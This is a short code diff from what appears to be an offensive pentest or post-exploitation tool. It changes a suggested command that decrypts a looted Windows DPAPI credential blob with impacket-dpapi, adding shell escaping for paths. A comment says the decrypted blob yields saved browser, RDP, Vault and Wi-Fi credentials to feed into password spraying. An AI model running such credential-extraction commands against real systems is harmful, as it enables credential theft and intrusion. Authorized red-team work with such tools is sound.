@@ -1289,7 +1289,10 @@ def run(report, store, ui=None):
                 f"masterkey sha1={sha1[:16]}... + {os.path.basename(bsrc)}",
                 crit=8, conf=0.85, ready=1.5, prox=0.85,        # score 8.67
                 commands=[
-                    f"impacket-dpapi credential -key 0x{sha1} '{bsrc}'",
+                    # iter-146: shell-escape the blob path - Windows loot
+                    # directories dumped via smbclient often reach us with
+                    # spaces or apostrophes in the path.
+                    f"impacket-dpapi credential -key 0x{sha1} '{_sh_sq(bsrc)}'",
                     f"# decrypted blob holds saved Chrome/RDP/Vault/Wifi creds; "
                     f"feed any plaintext into spray (R1)",
                 ], src=bsrc, line=bln))
